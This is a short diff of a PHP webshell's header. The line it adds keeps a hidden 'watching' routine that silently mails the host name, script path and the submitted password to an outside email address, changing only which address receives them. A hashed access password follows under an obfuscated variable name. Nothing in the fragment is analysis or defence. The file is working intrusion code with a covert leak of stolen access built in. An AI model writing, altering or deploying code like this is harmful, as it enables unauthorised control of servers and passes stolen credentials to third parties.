@@ -1,7 +1,7 @@
 <?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('rahmatabdaz@gmail.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('gojajangsutisna@gmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
 $▛ = "2a5cf1b11beef8592559e021d69ec1d1";
